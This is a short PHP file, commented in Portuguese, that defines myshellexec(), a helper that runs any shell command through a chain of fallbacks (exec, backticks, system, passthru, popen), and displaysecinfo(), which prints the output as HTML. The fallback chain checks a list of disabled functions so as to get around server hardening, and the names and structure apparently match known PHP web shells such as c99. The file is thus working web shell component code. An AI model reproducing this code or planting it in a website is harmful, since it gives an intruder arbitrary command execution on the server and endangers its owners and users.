<?php
/*
 * Arquivo com funções de execução de comandos no terminal bash
 */

/*
 * Função de execução de comandos no terminal bash
 */
function myshellexec($cmd) {
    global $disablefunc;
    $result = "";
    if (!empty($cmd)) {
        if (is_callable("exec")) {
            exec($cmd, $result);
            $result = join("\n", $result);
        } elseif (($result = `$cmd`) !== FALSE) {
            
        } elseif (is_callable("system") and ! in_array("system", $disablefunc)) {
            $v = @ob_get_contents();
            @ob_clean();
            system($cmd);
            $result = @ob_get_contents();
            @ob_clean();
            echo $v;
        } elseif (is_callable("passthru") and ! in_array("passthru", $disablefunc)) {
            $v = @ob_get_contents();
            @ob_clean();
            passthru($cmd);
            $result = @ob_get_contents();
            @ob_clean();
            echo $v;
        } elseif (is_resource($fp = popen($cmd, "r"))) {
            $result = "";
            while (!feof($fp)) {
                $result .= fread($fp, 1024);
            }
            pclose($fp);
        }
    }
    return $result;
}

/*
 * Função de formatação de resutados de saida no terminal
 */
function displaysecinfo($name, $value) {
    if (!empty($value)) {
        if (!empty($name)) {
            $name = "<b>" . $name . " - </b>";
        }
        echo $name . nl2br($value) . "<br>";
    }
}
